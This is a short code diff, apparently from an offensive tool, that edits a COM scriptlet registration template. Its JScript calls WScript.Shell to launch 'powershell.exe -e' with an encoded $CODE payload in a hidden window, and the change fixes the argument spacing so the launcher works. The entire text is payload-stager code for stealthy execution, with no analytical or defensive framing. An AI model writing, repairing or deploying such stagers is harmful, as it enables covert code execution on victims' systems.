@@ -203,7 +203,7 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
  >
  <script language="JScript">
       <![CDATA[
-           var r = new ActiveXObject("WScript.Shell").Run("''powershell.exe -e' + $CODE + '",0);
+           var r = new ActiveXObject("WScript.Shell").Run("''powershell.exe -e ' + $CODE + '",0);
       ]]>
  </script>
 </registration>
